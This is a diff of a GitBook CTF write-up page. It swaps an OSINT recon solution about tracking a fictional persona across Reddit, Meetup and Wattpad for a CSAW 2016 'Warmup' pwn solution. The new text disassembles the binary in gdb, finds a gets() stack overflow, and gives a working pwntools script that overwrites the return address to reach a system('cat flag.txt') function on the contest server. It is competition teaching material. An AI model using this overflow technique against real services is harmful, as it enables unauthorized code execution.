@@ -2,7 +2,7 @@
 <!DOCTYPE HTML>
 <html lang="" >
     <head>
-        <title>Eric Zhi Lang · GitBook</title>
+        <title>Warmup · GitBook</title>
         <meta charset="UTF-8">
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
@@ -57,10 +57,10 @@
     <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
 
     
-    <link rel="next" href="fuzyll.html" />
+    <link rel="next" href="tutorial.html" />
     
     
-    <link rel="prev" href="../pwn/tutorial.html" />
+    <link rel="prev" href="../forensics/clamsdontdance.html" />
     
 
     </head>
@@ -155,9 +155,9 @@
         
         
     
-        <li class="chapter " data-level="3.1" data-path="../pwn/warmup.html">
+        <li class="chapter active" data-level="3.1" data-path="warmup.html">
             
-                <a href="../pwn/warmup.html">
+                <a href="warmup.html">
             
                     
                     Warmup
@@ -168,9 +168,9 @@
             
         </li>
     
-        <li class="chapter " data-level="3.2" data-path="../pwn/tutorial.html">
+        <li class="chapter " data-level="3.2" data-path="tutorial.html">
             
-                <a href="../pwn/tutorial.html">
+                <a href="tutorial.html">
             
                     
                     Tutorial
@@ -188,9 +188,9 @@
         
         
     
-        <li class="chapter active" data-level="4.1" data-path="ericzhilang.html">
+        <li class="chapter " data-level="4.1" data-path="../recon/ericzhilang.html">
             
-                <a href="ericzhilang.html">
+                <a href="../recon/ericzhilang.html">
             
                     
                     Eric Zhi Lang
@@ -201,9 +201,9 @@
             
         </li>
     
-        <li class="chapter " data-level="4.2" data-path="fuzyll.html">
+        <li class="chapter " data-level="4.2" data-path="../recon/fuzyll.html">
             
-                <a href="fuzyll.html">
+                <a href="../recon/fuzyll.html">
             
                     
                     Fuzyll
@@ -277,7 +277,7 @@
     <!-- Title -->
     <h1>
         <i class="fa fa-circle-o-notch fa-spin"></i>
-        <a href=".." >Eric Zhi Lang</a>
+        <a href=".." >Warmup</a>
     </h1>
 </div>
 
@@ -292,43 +292,72 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <h1 id="eric-zhi-liang">Eric Zhi Liang</h1><p>We tried very hard to find Eric last year. You&apos;re going to have to try just as hard this year, since not even his friends can find him.</p><p>We heard Eric has his own subreddit. Can you find Eric for us?</p><h2 id="solution">Solution</h2><p>Write up by: Stacy</p><ul><li>Googled &#x201C;Eric Liang Reddit&#x201D;
-</li>
-<li>Found <a href="https://www.reddit.com/r/ericliang/" target="_blank">https://www.reddit.com/r/ericliang/</a>
-</li>
-<li>theRealEricLiang was one of the moderators
-</li>
-<li>Looked through theRealEricLiang&#x2019;s comments and posts
-</li>
-<li>Found a post by Eric mentioning he went to a Hackster Meetup in NYC
-</li>
-<li>Googled &#x201C;Hackster Meetup in NYC&#x201D;
-</li>
-<li>Found <a href="http://www.meetup.com/Hackster-NYC/" target="_blank">http://www.meetup.com/Hackster-NYC/</a>
-</li>
-<li>Searched member database for &#x201C;Eric&#x201D;
-</li>
-<li>Found Eric&#x2019;s profile page on the new site: <a href="http://www.meetup.com/Hackster-NYC/members/175983362/" target="_blank">http://www.meetup.com/Hackster-NYC/members/175983362/</a>
-</li>
-<li>Found his profile info: &#x201C;I love fanfiction and Allen Lau!&#x201D;
-</li>
-<li>Googled Allen Lau
-</li>
-<li>Found that Allen Lau is the CEO and co-founder of something called Wattpad
-</li>
-<li>Googled Wattpad and found that it was a website
-</li>
-<li>Noticed a &#x201C;fanfiction&#x201D; section on the <a href="https://www.wattpad.com/stories/fanfiction" target="_blank">Wattpad website</a>
-</li>
-<li>Searched for &#x201C;Eric Liang&#x201D; in the search bar 
-</li>
-<li>Eric Zhi Liang is the first result for &#x201C;People&#x201D; on the right
-</li>
-<li>Eric Zhi Liang&#x2019;s profile: <a href="https://www.wattpad.com/user/ericZhiLiang" target="_blank">https://www.wattpad.com/user/ericZhiLiang</a>
-</li>
-<li>Found flag in his profile description
-</li></ul>
-<h2 id="flag">Flag</h2><pre><code>flag{i_readbear_fanfix}</code></pre>
+                                <h1 id="warmup">Warmup</h1><p>So you want to be a pwn-er huh? Well let&apos;s throw you an easy one ;)</p><p><code>nc pwn.chal.csaw.io 8000</code></p><h1 id="solution">Solution</h1><p>Write up by: SneakyNachos</p><p>Weirdly I had the file as a elf32, but I guess they hot-fixed the question and 
+made it x64.</p><p>Doing a quick file on the new x64 version.</p><pre><code>$ file warmup 
+warmup: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=ab209f3b8a3c2902e1a2ecd5bb06e258b45605a4, not stripped</code></pre>
+<p>First I create a simple test.gdb to use with gdb and dump the main.</p><pre><code>$gdb -q warmup -command=test.gdb
+(gdb) x/30i main
+0x40061d &lt;main&gt;:    push   rbp
+0x40061e &lt;main+1&gt;:    mov    rbp,rsp
+0x400621 &lt;main+4&gt;:    add    rsp,0xffffffffffffff80
+0x400625 &lt;main+8&gt;:    mov    edx,0xa
+0x40062a &lt;main+13&gt;:    mov    esi,0x400741
+0x40062f &lt;main+18&gt;:    mov    edi,0x1
+0x400634 &lt;main+23&gt;:    call   0x4004c0 &lt;write@plt&gt;
+0x400639 &lt;main+28&gt;:    mov    edx,0x4
+0x40063e &lt;main+33&gt;:    mov    esi,0x40074c
+0x400643 &lt;main+38&gt;:    mov    edi,0x1
+0x400648 &lt;main+43&gt;:    call   0x4004c0 &lt;write@plt&gt;
+0x40064d &lt;main+48&gt;:    lea    rax,[rbp-0x80]
+0x400651 &lt;main+52&gt;:    mov    edx,0x40060d
+0x400656 &lt;main+57&gt;:    mov    esi,0x400751
+0x40065b &lt;main+62&gt;:    mov    rdi,rax
+0x40065e &lt;main+65&gt;:    mov    eax,0x0
+0x400663 &lt;main+70&gt;:    call   0x400510 &lt;sprintf@plt&gt;
+0x400668 &lt;main+75&gt;:    lea    rax,[rbp-0x80]
+0x40066c &lt;main+79&gt;:    mov    edx,0x9
+0x400671 &lt;main+84&gt;:    mov    rsi,rax
+0x400674 &lt;main+87&gt;:    mov    edi,0x1
+0x400679 &lt;main+92&gt;:    call   0x4004c0 &lt;write@plt&gt;
+0x40067e &lt;main+97&gt;:    mov    edx,0x1
+0x400683 &lt;main+102&gt;:    mov    esi,0x400755
+0x400688 &lt;main+107&gt;:    mov    edi,0x1
+0x40068d &lt;main+112&gt;:    call   0x4004c0 &lt;write@plt&gt;
+0x400692 &lt;main+117&gt;:    lea    rax,[rbp-0x40]
+0x400696 &lt;main+121&gt;:    mov    rdi,rax
+0x400699 &lt;main+124&gt;:    mov    eax,0x0
+0x40069e &lt;main+129&gt;:    call   0x400500 &lt;gets@plt&gt;</code></pre>
+<p>Looks to be a normal &quot;gets&quot; based overflow as none of the defenses are on.</p><p>After running &quot;nm -g -C warmup&quot; I noticed a weird &quot;easy&quot; function.</p><p>Let&apos;s dump that function.</p><pre><code>(gdb) x/6i easy
+0x40060d &lt;easy&gt;:    push   rbp
+0x40060e &lt;easy+1&gt;:    mov    rbp,rsp
+0x400611 &lt;easy+4&gt;:    mov    edi,0x400734
+0x400616 &lt;easy+9&gt;:    call   0x4004d0 &lt;system@plt&gt;
+0x40061b &lt;easy+14&gt;:    pop    rbp
+0x40061c &lt;easy+15&gt;:    ret    
+(gdb) x/s 0x400734
+0x400734:    &quot;cat flag.txt&quot;</code></pre>
+<p>Well that&apos;s nice of them. They have a function that does system(&quot;cat flag.txt&quot;) 
+for us.</p><p>So all we need to do is overflow the stack using our input to the &quot;gets&quot; function
+and make it such that rip points at easy which is at &quot;0x40060d&quot;.</p><p>I found control of the rip after the input was at a size of 72. So below is the
+python script that I put together to interact and exploit the service using
+pwntools to make the socket communication easier.</p><pre><code>from pwn import *
+def main():
+    HOST = &quot;pwn.chal.csaw.io&quot;
+    PORT = 8000
+
+    #0x40060d - easy
+    #Overflow at 72
+    payload = &quot;\x90&quot;*(72)+&quot;\x0d\x06\x40\x00\x00\x00&quot;
+
+    r = remote(HOST,PORT)
+    print r.recvline()
+
+    #Send payload, then interact
+    r.sendline(payload)
+    r.interactive()
+    pass
+main()</code></pre>
+<p>And now they would print back the flag to you.</p><h1 id="flag">Flag</h1><pre><code>FLAG{LET_US_BEGIN_CSAW_2016}</code></pre>
 
                                 
                                 </section>
@@ -356,12 +385,12 @@
 
             
                 
-                <a href="../pwn/tutorial.html" class="navigation navigation-prev " aria-label="Previous page: Tutorial">
+                <a href="../forensics/clamsdontdance.html" class="navigation navigation-prev " aria-label="Previous page: Clams Don't Dance">
                     <i class="fa fa-angle-left"></i>
                 </a>
                 
                 
-                <a href="fuzyll.html" class="navigation navigation-next " aria-label="Next page: Fuzyll">
+                <a href="tutorial.html" class="navigation navigation-next " aria-label="Next page: Tutorial">
                     <i class="fa fa-angle-right"></i>
                 </a>
                 
@@ -372,7 +401,7 @@
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"value":10,"category":"Recon","title":"Eric Zhi Lang","level":"4.1","depth":1,"next":{"title":"Fuzyll","level":"4.2","depth":1,"path":"recon/fuzyll.md","ref":"recon/fuzyll.md","articles":[]},"previous":{"title":"Tutorial","level":"3.2","depth":1,"path":"pwn/tutorial.md","ref":"pwn/tutorial.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"recon/ericzhilang.md","mtime":"2016-10-10T18:01:39.488Z","type":"markdown"},"gitbook":{"version":"3.2.0","time":"2016-10-10T19:43:09.832Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"value":50,"category":"Pwn","author":"SneakyNachos","title":"Warmup","level":"3.1","depth":1,"next":{"title":"Tutorial","level":"3.2","depth":1,"path":"pwn/tutorial.md","ref":"pwn/tutorial.md","articles":[]},"previous":{"title":"Clams Don't Dance","level":"2.3","depth":1,"path":"forensics/clamsdontdance.md","ref":"forensics/clamsdontdance.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"pwn/warmup.md","mtime":"2016-10-10T18:13:25.367Z","type":"markdown"},"gitbook":{"version":"3.2.0","time":"2016-10-10T19:43:09.832Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
